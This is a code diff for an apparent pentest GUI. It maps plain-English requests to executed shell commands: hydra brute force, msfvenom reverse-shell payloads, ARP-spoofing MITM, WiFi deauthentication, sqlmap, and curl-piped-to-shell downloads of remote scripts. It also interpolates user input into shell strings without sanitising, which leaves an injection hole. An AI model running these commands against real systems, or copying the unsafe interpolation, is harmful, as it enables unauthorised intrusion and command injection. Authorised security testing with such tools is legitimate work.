@@ -820,6 +820,13 @@ class MaximWindow(QMainWindow):
             self._execute_command(f"{app_cmd} &>/dev/null &")
             return
 
+        # 4c. Natural language → CLI command mapping
+        # Handles everything a pentester might type in plain English
+        nl_cmd = self._natural_language_to_cmd(query, q_lower, target_ip, target_port)
+        if nl_cmd:
+            self._execute_command(nl_cmd)
+            return
+
         # 5. Handshake capture / hack / crack WiFi workflow
         handshake_match = re.search(r'(?:capture|get|grab)\s+(?:the\s+)?handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
         if not handshake_match:
@@ -859,6 +866,263 @@ class MaximWindow(QMainWindow):
                     f"\n[!] Don't know how to: {query}\n"
                     f"    Set up AI: AI menu > Set API Key.\n"
                 )
+
+    def _natural_language_to_cmd(self, query, q, tip, tport):
+        """Convert natural language to CLI command. Returns cmd string or None."""
+        # Helper: extract target (IP or domain) from query
+        def t(default=''):
+            return tip or default
+
+        def p(default='80'):
+            return tport or default
+
+        # ── Network scanning ──
+        if re.search(r'\b(scan|nmap)\b.*\b(network|subnet|range|lan)\b', q) or re.search(r'\b(network|subnet|lan)\b.*\b(scan)\b', q):
+            return f"sudo nmap -sn {t('192.168.1.0/24')}"
+        if re.search(r'\bquick\s*scan\b', q):
+            return f"nmap -T4 -F {t('192.168.1.1')}"
+        if re.search(r'\b(full|deep|aggressive|complete)\s*(port\s*)?(scan)\b', q):
+            return f"sudo nmap -A -T4 -p- {t('192.168.1.1')}"
+        if re.search(r'\b(scan|check)\s*(all\s+)?(ports?|services?)\b', q) and tip:
+            return f"sudo nmap -sV -sC -p- {t()}"
+        if re.search(r'\b(port|service)\s*scan\b', q):
+            return f"nmap -sV -sC {t('192.168.1.1')}"
+        if re.search(r'\b(stealth|syn)\s*scan\b', q):
+            return f"sudo nmap -sS -T4 {t('192.168.1.1')}"
+        if re.search(r'\budp\s*scan\b', q):
+            return f"sudo nmap -sU --top-ports 100 {t('192.168.1.1')}"
+        if re.search(r'\b(os|operating\s*system)\s*(detect|scan|fingerprint)\b', q):
+            return f"sudo nmap -O {t('192.168.1.1')}"
+        if re.search(r'\bscan\b.*\bsmb\b|\bsmb\b.*\bscan\b', q):
+            return f"sudo nmap --script smb-enum-shares,smb-enum-users -p 445 {t('192.168.1.1')}"
+        if re.search(r'\bscan\b', q) and tip:
+            return f"nmap -sV -sC {t()}"
+
+        # ── Network discovery ──
+        if re.search(r'\bwho\s*(is|\'s)\s*(on|connected|in)\b', q) or re.search(r'\b(discover|find)\s*(hosts?|devices?|machines?)\b', q):
+            return f"sudo netdiscover -r {t('192.168.1.0/24')} -P"
+        if re.search(r'\barp\s*(scan|table|cache)\b', q):
+            return f"sudo arp-scan -l"
+
+        # ── My info ──
+        if re.search(r'\b(my|what.s my|show my|check my|get my)\s*(ip|address)\b', q) or q in ('ip', 'ip a', 'my ip', 'ipconfig'):
+            return "ip -br addr"
+        if re.search(r'\b(show|list|check)\s*(interfaces?|adapters?|nics?)\b', q):
+            return "ip -br link"
+        if re.search(r'\b(show|check|list)\s*(route|routing|gateway)\b', q):
+            return "ip route"
+        if re.search(r'\b(show|check)\s*(dns|resolv|nameserver)\b', q):
+            return "cat /etc/resolv.conf"
+        if re.search(r'\bpublic\s*ip\b', q) or re.search(r'\bexternal\s*ip\b', q):
+            return "curl -s ifconfig.me && echo"
+        if re.search(r'\b(show|check|list)\s*(connections?|sockets?|listening|ports?)\b', q):
+            return "ss -tulnp"
+        if re.search(r'\b(who\s*am\s*i|whoami|current\s*user)\b', q):
+            return "whoami && id"
+
+        # ── DNS / WHOIS ──
+        if re.search(r'\b(dns|nslookup|resolve)\s', q) and tip:
+            return f"dig {t()} ANY +short"
+        if re.search(r'\b(lookup|whois|who\s*owns?)\b', q) and tip:
+            return f"whois {t()}"
+        if re.search(r'\b(subdomain|sub\s*domain)\b', q) and tip:
+            return f"subfinder -d {t()} -silent 2>/dev/null || amass enum -passive -d {t()} 2>/dev/null || dig {t()} ANY"
+        if re.search(r'\btraceroute\b|\btrace\s*route\b', q):
+            return f"traceroute {t('8.8.8.8')}"
+
+        # ── WiFi ──
+        if re.search(r'\b(monitor\s*mode|mon\s*mode)\s*(on|enable|start)\b', q) or re.search(r'\b(enable|start|set)\s*monitor\b', q):
+            return "sudo airmon-ng start wlan0"
+        if re.search(r'\b(monitor\s*mode|mon\s*mode)\s*(off|disable|stop)\b', q) or re.search(r'\b(disable|stop)\s*monitor\b', q):
+            return "sudo airmon-ng stop wlan0mon"
+        if re.search(r'\b(scan|list|show|find)\s*(wifi|wireless|wlan|access\s*point|ap|network|ssid|essid)\b', q):
+            return "sudo airodump-ng wlan0"
+        if re.search(r'\bdeauth\b', q) and tip:
+            return f"sudo aireplay-ng --deauth 0 -a {t()} wlan0"
+        if re.search(r'\b(change|spoof|randomize|random)\s*(my\s+)?mac\b', q):
+            iface_m = re.search(r'\b(wlan\d+|eth\d+|en\w+)\b', q)
+            ifc = iface_m.group(1) if iface_m else 'wlan0'
+            return f"sudo ip link set {ifc} down && sudo macchanger -r {ifc} && sudo ip link set {ifc} up"
+
+        # ── Web scanning ──
+        if re.search(r'\b(nikto|web\s*scan|scan\s*web)\b', q) and tip:
+            return f"nikto -h {t()}"
+        if re.search(r'\b(dir|directory|directories|path|hidden)\s*(scan|brute|bust|fuzz|enum|find)\b', q) and tip:
+            return f"gobuster dir -u http://{t()} -w /usr/share/wordlists/dirb/common.txt -t 50"
+        if re.search(r'\bfuzz\b', q) and tip:
+            return f"ffuf -u http://{t()}/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50"
+        if re.search(r'\bwhatweb\b|what\s*(is|technology|tech|cms|framework)\b.*\brun', q) and tip:
+            return f"whatweb {t()}"
+        if re.search(r'\b(headers?|response)\b.*\b(check|show|get)\b|\b(check|show|get)\b.*\b(headers?)\b', q) and tip:
+            return f"curl -sI http://{t()}"
+
+        # ── SQL injection ──
+        if re.search(r'\bsql\s*(inject|i)\b|\bsqlmap\b', q) and tip:
+            url = tip if '/' in tip else f"http://{tip}"
+            return f"sqlmap -u '{url}' --batch --level 3 --risk 2"
+
+        # ── Brute force ──
+        if re.search(r'\bbrute\s*force\b.*\bssh\b|\bssh\b.*\bbrute\b', q):
+            return f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{t('192.168.1.1')} -t 4"
+        if re.search(r'\bbrute\s*force\b.*\bftp\b|\bftp\b.*\bbrute\b', q):
+            return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{t('192.168.1.1')} -t 4"
+        if re.search(r'\bbrute\s*force\b.*\b(http|web|login)\b|\b(http|web|login)\b.*\bbrute\b', q):
+            return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {t('192.168.1.1')} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+        if re.search(r'\bbrute\s*force\b.*\brdp\b|\brdp\b.*\bbrute\b', q):
+            return f"hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{t('192.168.1.1')} -t 1"
+        if re.search(r'\bbrute\s*force\b', q) and tip:
+            return f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {t()} ssh -t 4"
+
+        # ── Exploitation ──
+        if re.search(r'\b(search|find)\s*(exploit|vulnerability|cve)\b', q):
+            term = re.sub(r'.*?(search|find)\s*(exploit|vulnerability|cve)\s*(for|about|on|in)?\s*', '', q).strip()
+            return f"searchsploit {term or 'apache'}"
+        if re.search(r'\b(reverse\s*shell|rev\s*shell)\b', q):
+            port_m = re.search(r'(\d{2,5})', q)
+            pt = port_m.group(1) if port_m else '4444'
+            return f"nc -lvnp {pt}"
+        if re.search(r'\blisten\b.*\bport\b|\bport\b.*\blisten\b', q):
+            port_m = re.search(r'(\d{2,5})', q)
+            pt = port_m.group(1) if port_m else '4444'
+            return f"nc -lvnp {pt}"
+        if re.search(r'\b(generate|create|make)\s*(payload|backdoor|trojan)\b', q):
+            return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={t('192.168.1.100')} LPORT=4444 -f elf -o shell.elf"
+
+        # ── Sniffing / MITM ──
+        if re.search(r'\bsniff\b|\bcapture\s*packets?\b|\bpcap\b', q):
+            iface_m = re.search(r'\b(wlan\d+|eth\d+|en\w+)\b', q)
+            ifc = iface_m.group(1) if iface_m else 'eth0'
+            return f"sudo tcpdump -i {ifc} -w capture.pcap"
+        if re.search(r'\bmitm\b|\bman\s*in\s*the\s*middle\b|\barp\s*spoof\b|\barp\s*poison\b', q):
+            return f"sudo ettercap -T -M arp:remote /{t('192.168.1.1')}// /{t('192.168.1.0/24')}// -i eth0"
+        if re.search(r'\bintercept\b', q) and tip:
+            return f"sudo bettercap -iface eth0 -eval 'set arp.spoof.targets {t()}; arp.spoof on; net.sniff on'"
+
+        # ── Password / Hash cracking ──
+        if re.search(r'\b(crack|decode|decrypt)\b.*\b(hash|password|md5|sha|ntlm|bcrypt)\b', q):
+            hash_m = re.search(r'[a-fA-F0-9]{32,}', query)
+            if hash_m:
+                h = hash_m.group(0)
+                if len(h) == 32:
+                    return f"echo '{h}' > /tmp/hash.txt && hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force"
+                elif len(h) == 40:
+                    return f"echo '{h}' > /tmp/hash.txt && hashcat -m 100 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force"
+                elif len(h) == 64:
+                    return f"echo '{h}' > /tmp/hash.txt && hashcat -m 1400 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force"
+            return None
+        if re.search(r'\bidentify\s*hash\b|\bhash\s*type\b|\bwhat\s*(kind|type)\s*of\s*hash\b', q):
+            hash_m = re.search(r'[a-fA-F0-9]{16,}', query)
+            if hash_m:
+                return f"hashid '{hash_m.group(0)}' 2>/dev/null || hash-identifier"
+            return "hash-identifier"
+
+        # ── SMB / Enum ──
+        if re.search(r'\benum.*smb\b|\bsmb.*enum\b|\bsmb\s*shares?\b', q):
+            return f"enum4linux -a {t('192.168.1.1')}"
+        if re.search(r'\benum.*linux\b|\blinux.*enum\b', q) and tip:
+            return f"enum4linux -a {t()}"
+
+        # ── SSH / Connect ──
+        if re.search(r'\b(connect|ssh)\s*(to|into)\b', q) and tip:
+            user_m = re.search(r'\bas\s+(\w+)\b', q)
+            user = user_m.group(1) if user_m else 'root'
+            port_m = re.search(r'\bport\s*(\d+)\b', q)
+            pt = f" -p {port_m.group(1)}" if port_m else ""
+            return f"ssh {user}@{t()}{pt}"
+
+        # ── Download / Transfer ──
+        if re.search(r'\b(download|fetch|get)\s+(file\s+)?(from\s+)?', q) and tip:
+            url = tip if tip.startswith('http') else f"http://{tip}"
+            return f"wget '{url}'"
+        if re.search(r'\b(upload|transfer|send)\s+(file\s+)?(to\s+)?', q):
+            file_m = re.search(r'(?:upload|transfer|send)\s+(?:file\s+)?(.+?)(?:\s+to\s+|\s*$)', q)
+            if file_m and tip:
+                return f"scp {file_m.group(1).strip()} root@{t()}:/tmp/"
+
+        # ── System info ──
+        if re.search(r'\b(show|list|check)\s*(process|running|tasks?)\b', q) or q in ('ps', 'top', 'htop'):
+            return "ps aux --sort=-%mem | head -20"
+        if re.search(r'\b(show|check)\s*(memory|ram)\b', q) or q == 'free':
+            return "free -h"
+        if re.search(r'\b(show|check)\s*(disk|space|storage)\b', q) or q == 'df':
+            return "df -h"
+        if re.search(r'\b(system|os)\s*(info|version|details)\b', q) or re.search(r'\buname\b', q):
+            return "uname -a && cat /etc/os-release 2>/dev/null"
+        if re.search(r'\b(show|check)\s*(cpu|processor)\b', q):
+            return "lscpu | head -15"
+        if re.search(r'\b(show|list)\s*(users?|accounts?)\b', q):
+            return "cat /etc/passwd | grep -v nologin | grep -v false"
+        if re.search(r'\b(show|check)\s*(cron|scheduled|jobs?)\b', q):
+            return "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null"
+        if re.search(r'\b(show|find)\s*(suid|setuid)\b', q):
+            return "find / -perm -4000 -type f 2>/dev/null"
+        if re.search(r'\b(show|find)\s*(writable|world.writable)\b', q):
+            return "find / -writable -type f 2>/dev/null | head -50"
+        if re.search(r'\blinpeas\b|\bprivilege\s*escalation\b|\bprivesc\b', q):
+            return "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+
+        # ── File operations ──
+        if re.search(r'\b(edit|modify|change)\s+(file\s+)?(.+)', q):
+            file_m = re.search(r'\b(edit|modify|change)\s+(?:file\s+)?(.+)', q)
+            if file_m:
+                return f"nano {file_m.group(2).strip()}"
+        if re.search(r'\b(show|read|view|display|print)\s+(file\s+|content\s+of\s+)?(.+)', q):
+            file_m = re.search(r'\b(show|read|view|display|print)\s+(?:file\s+|content\s+of\s+)?(.+)', q)
+            if file_m:
+                path = file_m.group(2).strip()
+                if '/' in path or '.' in path:
+                    return f"cat {path}"
+
+        # ── Package management ──
+        if re.search(r'\binstall\s+(.+)', q):
+            pkg = re.search(r'\binstall\s+(.+)', q).group(1).strip()
+            return f"sudo apt install -y {pkg}"
+        if re.search(r'\b(update|upgrade)\s*(system|packages?|kali|apt)?\s*$', q):
+            return "sudo apt update && sudo apt upgrade -y"
+        if re.search(r'\bremove\s+(.+)', q):
+            pkg = re.search(r'\bremove\s+(.+)', q).group(1).strip()
+            return f"sudo apt remove {pkg}"
+
+        # ── Tor / Anonymity ──
+        if re.search(r'\b(start|enable)\s*(tor|anonymi|anon)\b', q):
+            return "sudo systemctl start tor && echo 'Tor started' && curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip"
+        if re.search(r'\b(stop|disable)\s*tor\b', q):
+            return "sudo systemctl stop tor && echo 'Tor stopped'"
+        if re.search(r'\b(check|am\s*i)\s*(anonymous|anon|tor)\b', q):
+            return "curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null || echo 'Tor not running'"
+
+        # ── Services ──
+        if re.search(r'\b(start|stop|restart|status)\s+(apache|nginx|ssh|mysql|postgres|smb|ftp|docker)\b', q):
+            m = re.search(r'\b(start|stop|restart|status)\s+(\w+)', q)
+            svc_map = {'apache': 'apache2', 'postgres': 'postgresql', 'smb': 'smbd', 'ftp': 'vsftpd'}
+            svc = svc_map.get(m.group(2), m.group(2))
+            return f"sudo systemctl {m.group(1)} {svc}"
+
+        # ── Misc ──
+        if q in ('clear', 'cls'):
+            return "clear"
+        if re.search(r'\b(show|check)\s*(date|time)\b', q):
+            return "date"
+        if re.search(r'\b(show|check)\s*(weather)\b', q):
+            return "curl -s wttr.in/?format=3"
+        if re.search(r'\bspeed\s*test\b', q):
+            return "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3"
+        if re.search(r'\bgenerate\s*(password|pass)\b', q):
+            return "openssl rand -base64 20"
+        if re.search(r'\b(encode|base64)\b', q):
+            text_m = re.search(r'(?:encode|base64)\s+(.+)', q)
+            if text_m:
+                return f"echo -n '{text_m.group(1).strip()}' | base64"
+        if re.search(r'\b(decode)\s*(base64)?\b', q):
+            text_m = re.search(r'(?:decode)\s*(?:base64)?\s+(.+)', q)
+            if text_m:
+                return f"echo '{text_m.group(1).strip()}' | base64 -d && echo"
+
+        # ── Ping ──
+        if re.search(r'^ping\s', q) or (re.search(r'\bping\b', q) and tip):
+            return f"ping -c 4 {t('8.8.8.8')}"
+
+        return None
 
     def _ai_execute(self, query):
         self._set_running(True, f"⚡ AI thinking: {query[:50]}...")
